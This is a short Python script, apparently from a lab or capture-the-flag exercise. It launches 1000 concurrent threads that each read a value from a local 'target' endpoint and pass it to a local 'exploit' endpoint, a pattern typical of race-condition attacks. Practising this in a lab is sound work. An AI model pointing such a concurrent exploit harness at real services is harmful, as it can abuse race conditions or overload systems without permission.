from threading import Thread
import requests

def exploit():
    i = requests.get("http://localhost:8000/target").text
    url = "http://localhost:9000/exploit/" + str(i)
    response = requests.get(url)
    print(response.text)

def main():
    threads = []
    for i in range(0, 1000):
        t = Thread(target=exploit)
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == '__main__':
    main()